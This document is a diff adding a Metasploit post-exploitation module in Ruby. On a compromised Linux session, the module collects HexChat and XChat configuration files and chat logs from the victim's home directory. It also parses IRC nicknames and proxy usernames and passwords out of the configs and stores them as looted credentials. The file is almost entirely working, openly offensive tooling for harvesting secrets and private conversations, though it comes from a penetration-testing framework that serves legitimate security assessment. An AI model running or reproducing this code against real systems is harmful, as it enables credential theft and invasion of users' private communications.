@@ -1,0 +1,233 @@
+##
+# This module requires Metasploit: https://metasploit.com/download
+# Current source: https://github.com/rapid7/metasploit-framework
+##
+
+class MetasploitModule < Msf::Post
+  include Msf::Post::File
+  include Msf::Exploit::Deprecated
+
+  moved_from 'post/linux/gather/enum_xchat'
+
+  def initialize(info = {})
+    super(
+      update_info(
+        info,
+        'Name' => 'Linux Gather HexChat/XChat Enumeration',
+        'Description' => %q{
+          This module will collect HexChat and XChat's config files and chat logs from the victim's
+          machine.  There are three actions you may choose: CONFIGS, CHATS, and ALL.  The
+          CONFIGS option can be used to collect information such as channel settings,
+          channel/server passwords, etc.  The CHATS option will simply download all the
+          .log files.
+        },
+        'License' => MSF_LICENSE,
+        'Author' => ['sinn3r', 'h00die'],
+        'Platform' => ['linux'],
+        'SessionTypes' => ['shell', 'meterpreter'],
+        'Actions' =>
+          [
+            ['CONFIGS', { 'Description' => 'Collect config files' } ],
+            ['CHATS', { 'Description' => 'Collect chat logs with a pattern' } ],
+            ['ALL', { 'Description' => 'Collect both the plists and chat logs' }]
+          ],
+        'DefaultAction' => 'ALL'
+      )
+    )
+    register_options([
+      OptBool.new('HEXCHAT', [false, 'Enumerate hexchat', true ]),
+      OptBool.new('XCHAT', [false, 'Enumerate xchat', false ])
+    ])
+  end
+
+  def whoami
+    cmd_exec('/usr/bin/whoami').chomp
+  end
+
+  def get_paths
+    user = whoami
+    fail_with(Failure::Unknown, 'Unable to get username.') if user.blank?
+    vprint_status("Detcted username: #{user}")
+
+    paths = []
+    if datastore['HEXCHAT']
+      # https://hexchat.readthedocs.io/en/latest/settings.html
+      paths << "/home/#{user}/.config/hexchat/"
+    end
+    if datastore['XCHAT']
+      paths << "/home/#{user}/.xchat2/"
+    end
+    paths
+  end
+
+  def list_logs(base, mode = 'HEXCHAT')
+    files = []
+    if mode == 'HEXCHAT'
+      # hexchat has a folder for each server
+      # inside each folder, like 'freenode'
+      # are files: sever.log, <server>.log, .log
+      folders = dir base
+      folders.each do |folder|
+        file = dir "#{base}/#{folder}"
+        file.each do |f|
+          if f.end_with? '.log'
+            files << "#{base}/#{folder}/#{f}"
+          end
+        end
+      end
+    elsif mode == 'XCHAT'
+      # the original methods written by @sinn3r
+      list = cmd_exec("ls -l #{base}*.log")
+      return [] if list =~ /No such file or directory/
+
+      # currently unsure what this is intending to do XXX
+      files = list.scan(/\d+\x20\w{3}\x20\d+\x20\d{2}\:\d{2}\x20(.+)$/).flatten
+    end
+    files
+  end
+
+  def save(type, data)
+    case type
+    when :configs
+      type = 'hexchat.config'
+    when :chatlogs
+      type = 'hexchat.chatlogs'
+    end
+
+    data.each do |d|
+      fname = ::File.basename(d[:filename])
+      p = store_loot(
+        type,
+        'text/plain',
+        session,
+        d[:data],
+        fname
+      )
+      print_good("#{fname} saved as #{p}")
+    end
+  end
+
+  def get_chatlogs(base)
+    logs = []
+    if datastore['XCHAT']
+      base_logs = "#{base}/xchatlogs"
+      vprint_error("Chat logs not found at #{base_logs}") unless directory? base_logs
+
+      list_logs(base_logs, 'xchat').each do |l|
+        vprint_status("Downloading: #{l}")
+        data = read_file(l)
+        logs << {
+          filename: l,
+          data: data
+        }
+      end
+    end
+    if datastore['HEXCHAT']
+      base_logs = "#{base}/logs"
+      vprint_error("Chat logs not found at #{base_logs}") unless directory? base_logs
+
+      list_logs(base_logs).each do |l|
+        vprint_status("Downloading: #{l}")
+        data = read_file(l)
+        logs << {
+          filename: l,
+          data: data
+        }
+      end
+    end
+
+    logs
+  end
+
+  def parse_config(conf)
+    if conf =~ /^irc_user_name = (.+)$/
+      print_good "IRC nick: #{Regexp.last_match(1)}"
+    end
+    if conf =~ /^irc_nick1 = (.+)$/
+      print_good "IRC nick1: #{Regexp.last_match(1)}"
+    end
+    if conf =~ /^irc_nick2 = (.+)$/
+      print_good "IRC nick2: #{Regexp.last_match(1)}"
+    end
+    if conf =~ /^irc_nick3 = (.+)$/
+      print_good "IRC nick3: #{Regexp.last_match(1)}"
+    end
+    /^net_proxy_user = (?<proxyuser>.+)$/ =~ conf
+    /^net_proxy_pass = (?<proxypass>.+)$/ =~ conf
+    /^net_proxy_host = (?<proxyhost>.+)$/ =~ conf
+    /^net_proxy_port = (?<proxyport>.+)$/ =~ conf
+    unless proxypass.blank? || proxyuser.blank? || proxyhost.blank? || proxyport.blank?
+      proxyhost.strip!
+      proxyport.strip!
+      proxyuser.strip!
+      proxypass.strip!
+      print_good("Proxy conf: #{proxyhost}:#{proxyport} -> #{proxyuser}/#{proxypass}")
+      create_credential_and_login({
+        address: proxyhost,
+        port: proxyport,
+        protocol: 'tcp',
+        workspace_id: myworkspace.id,
+        origin_type: :service,
+        private_type: :password,
+        private_data: proxypass,
+        public_data: proxyuser,
+        service_name: 'proxy',
+        module_fullname: self.fullname,
+        status: Metasploit::Model::Login::Status::UNTRIED
+      })
+    end
+  end
+
+  def get_configs(base)
+    config = []
+    files = []
+    if datastore['XCHAT']
+      files += ['servlist_.conf', 'xchat.conf']
+    end
+    if datastore['HEXCHAT']
+      files += ['servlist.conf', 'hexchat.conf']
+    end
+    files.each do |f|
+      conf = base + f
+      unless file? conf
+        vprint_error("File not found: #{conf}")
+        next
+      end
+      vprint_good("Downloading: #{conf}")
+      buf = read_file(conf)
+      next if buf.blank?
+
+      if conf.end_with? 'chat.conf'
+        parse_config buf
+      end
+      config << {
+        filename: f,
+        data: buf
+      }
+    end
+
+    config
+  end
+
+  def run
+    fail_with(Failure::BadConfig, 'Please specify an action.') if action.nil?
+
+    get_paths.each do |base|
+      unless directory? base
+        print_error("HexChat not installed or used by user. #{base} not found.")
+      end
+
+      configs = get_configs(base) if action.name =~ /ALL|CONFIGS/i
+      chatlogs = get_chatlogs(base) if action.name =~ /ALL|CHATS/i
+
+      save(:configs, configs) unless configs.empty?
+      save(:chatlogs, chatlogs) unless chatlogs.empty?
+    end
+  end
+end
+
+# Linux xchat path:
+# /home/[username]/.xchat2/
+#   * /home/[username]/.xchat2/servlist_.conf
+#   * /home/[username]/.xchat2/xchat.conf
+#   * /home/[username]/.xchat2/xchatlogs/FreeNode-#aha.log
